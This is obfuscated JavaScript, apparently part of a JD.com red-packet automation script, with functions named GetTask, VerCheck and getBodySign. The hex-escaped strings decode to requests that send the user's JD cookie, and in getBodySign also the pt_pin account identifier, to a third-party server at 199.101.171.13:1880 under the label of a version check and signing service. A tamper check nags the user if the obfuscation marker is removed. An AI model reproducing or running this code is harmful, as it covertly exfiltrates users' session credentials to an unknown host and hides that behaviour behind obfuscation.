var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd00f=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x3F\x61\x70\x70\x69\x64\x3D\x6A\x69\x6E\x6C\x69\x68\x6F\x6E\x67\x62\x61\x6F\x26\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x6C\x6F\x67\x69\x6E\x54\x79\x70\x65\x3D\x32\x26\x63\x6C\x69\x65\x6E\x74\x3D\x6A\x69\x6E\x6C\x69\x68\x6F\x6E\x67\x62\x61\x6F\x26\x74\x3D","\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x30\x2E\x33\x2E\x35\x26\x6F\x73\x56\x65\x72\x73\x69\x6F\x6E\x3D\x2D\x31","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x70\x70\x79\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x70\x70\x79\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x62\x65\x6C\x44\x69\x79\x2F\x7A\x6A\x79\x77\x2F\x33\x75\x67\x65\x64\x46\x61\x37\x79\x41\x36\x4E\x68\x78\x4C\x4E\x35\x67\x77\x32\x4C\x33\x50\x46\x39\x73\x51\x43\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C\x3F\x63\x68\x61\x6E\x6E\x65\x6C\x3D\x39","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x31\x30\x2E\x33\x2E\x32\x3B\x3B\x3B\x4D\x2F\x35\x2E\x30\x3B\x61\x70\x70\x42\x75\x69\x6C\x64\x2F\x31\x36\x37\x39\x32\x32\x3B\x6A\x64\x53\x75\x70\x70\x6F\x72\x74\x44\x61\x72\x6B\x4D\x6F\x64\x65\x2F\x30\x3B\x65\x66\x2F\x31\x3B\x65\x70\x2F\x25\x37\x42\x25\x32\x32\x63\x69\x70\x68\x65\x72\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x35\x25\x32\x43\x25\x32\x32\x63\x69\x70\x68\x65\x72\x25\x32\x32\x25\x33\x41\x25\x37\x42\x25\x32\x32\x75\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x59\x74\x44\x72\x45\x57\x48\x76\x43\x51\x48\x72\x5A\x4A\x4C\x73\x43\x32\x56\x74\x45\x51\x59\x6D\x59\x74\x43\x35\x59\x74\x54\x74\x43\x4A\x44\x74\x44\x4A\x55\x33\x43\x7A\x71\x6D\x5A\x4A\x48\x74\x5A\x74\x76\x73\x44\x47\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x73\x76\x25\x32\x32\x25\x33\x41\x25\x32\x32\x43\x4A\x43\x6B\x44\x71\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x61\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x48\x55\x55\x6E\x45\x4A\x55\x31\x43\x4A\x47\x6A\x45\x4A\x75\x32\x45\x4D\x30\x30\x44\x4E\x4C\x4E\x42\x55\x4F\x30\x43\x4A\x75\x6A\x43\x55\x54\x4E\x45\x4A\x47\x6E\x47\x30\x50\x4F\x43\x74\x4F\x34\x25\x32\x32\x25\x37\x44\x25\x32\x43\x25\x32\x32\x74\x73\x25\x32\x32\x25\x33\x41\x31\x36\x34\x38\x36\x31\x34\x30\x37\x31\x25\x32\x43\x25\x32\x32\x68\x64\x69\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x4A\x4D\x39\x46\x31\x79\x77\x55\x50\x77\x66\x6C\x76\x4D\x49\x70\x59\x50\x6F\x6B\x30\x74\x74\x35\x6B\x39\x6B\x57\x34\x41\x72\x4A\x45\x55\x33\x6C\x66\x4C\x68\x78\x42\x71\x77\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x76\x65\x72\x73\x69\x6F\x6E\x25\x32\x32\x25\x33\x41\x25\x32\x32\x31\x2E\x30\x2E\x33\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x70\x70\x6E\x61\x6D\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x63\x6F\x6D\x2E\x33\x36\x30\x62\x75\x79\x2E\x6A\x64\x6D\x6F\x62\x69\x6C\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x69\x64\x78\x25\x32\x32\x25\x33\x41\x2D\x31\x25\x37\x44\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x33\x5F\x36\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31\x3B","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function GetTask(_0x8edfx2){return  new Promise((_0x8edfx3)=>{$[__Oxdd00f[0xb]]({url:`${__Oxdd00f[0x0]}${_0x8edfx2}${__Oxdd00f[0x1]}${gettimestamp()}${__Oxdd00f[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x48\x6F\x73\x74":__Oxdd00f[0x3],"\x6F\x72\x69\x67\x69\x6E":__Oxdd00f[0x4],"\x72\x65\x66\x65\x72\x65\x72":__Oxdd00f[0x5],'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':__Oxdd00f[0x6],"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":__Oxdd00f[0x7]},body:helpno},(_0x8edfx4,_0x8edfx5,_0x8edfx6)=>{try{if(_0x8edfx6){_0x8edfx6= JSON[__Oxdd00f[0x8]](_0x8edfx6)}}catch(e){$[__Oxdd00f[0xa]](__Oxdd00f[0x9],e,_0x8edfx5)}finally{_0x8edfx3(_0x8edfx6)}})})}(function(_0x8edfx7,_0x8edfx8,_0x8edfx9,_0x8edfxa,_0x8edfxb,_0x8edfxc){_0x8edfxc= __Oxdd00f[0xc];_0x8edfxa= function(_0x8edfxd){if( typeof alert!== _0x8edfxc){alert(_0x8edfxd)};if( typeof console!== _0x8edfxc){console[__Oxdd00f[0xd]](_0x8edfxd)}};_0x8edfx9= function(_0x8edfxe,_0x8edfx7){return _0x8edfxe+ _0x8edfx7};_0x8edfxb= _0x8edfx9(__Oxdd00f[0xe],_0x8edfx9(_0x8edfx9(__Oxdd00f[0xf],__Oxdd00f[0x10]),__Oxdd00f[0x11]));try{_0x8edfx7= __encode;if(!( typeof _0x8edfx7!== _0x8edfxc&& _0x8edfx7=== _0x8edfx9(__Oxdd00f[0x12],__Oxdd00f[0x13]))){_0x8edfxa(_0x8edfxb)}}catch(e){_0x8edfxa(_0x8edfxb)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd00e=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6C\x79\x68\x62\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x54\x79\x70\x65\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x64\x61\x74\x61\x31","\x64\x61\x74\x61\x32","\x64\x61\x74\x61\x33","\x64\x61\x74\x61\x34","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x2f6dx2,_0x2f6dx3,_0x2f6dx4){return  new Promise((_0x2f6dx5)=>{$[__Oxdd00e[0xc]]({url:`${__Oxdd00e[0x0]}${_0x2f6dx2}${__Oxdd00e[0x1]}${_0x2f6dx3}${__Oxdd00e[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x2f6dx4,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x2f6dx6,_0x2f6dx7,_0x2f6dx8)=>{try{_0x2f6dx8= JSON[__Oxdd00e[0x3]](_0x2f6dx8);data1= _0x2f6dx8[__Oxdd00e[0x4]];helpno= _0x2f6dx8[__Oxdd00e[0x5]]+ _0x2f6dx8[__Oxdd00e[0x6]]+ _0x2f6dx8[__Oxdd00e[0x7]]+ _0x2f6dx8[__Oxdd00e[0x8]]+ _0x2f6dx8[__Oxdd00e[0x9]]}catch(e){$[__Oxdd00e[0xb]](__Oxdd00e[0xa],e)}finally{_0x2f6dx5(data1)}})})}(function(_0x2f6dx9,_0x2f6dxa,_0x2f6dxb,_0x2f6dxc,_0x2f6dxd,_0x2f6dxe){_0x2f6dxe= __Oxdd00e[0xd];_0x2f6dxc= function(_0x2f6dxf){if( typeof alert!== _0x2f6dxe){alert(_0x2f6dxf)};if( typeof console!== _0x2f6dxe){console[__Oxdd00e[0xe]](_0x2f6dxf)}};_0x2f6dxb= function(_0x2f6dx10,_0x2f6dx9){return _0x2f6dx10+ _0x2f6dx9};_0x2f6dxd= _0x2f6dxb(__Oxdd00e[0xf],_0x2f6dxb(_0x2f6dxb(__Oxdd00e[0x10],__Oxdd00e[0x11]),__Oxdd00e[0x12]));try{_0x2f6dx9= __encode;if(!( typeof _0x2f6dx9!== _0x2f6dxe&& _0x2f6dx9=== _0x2f6dxb(__Oxdd00e[0x13],__Oxdd00e[0x14]))){_0x2f6dxc(_0x2f6dxd)}}catch(e){_0x2f6dxc(_0x2f6dxd)}})({})






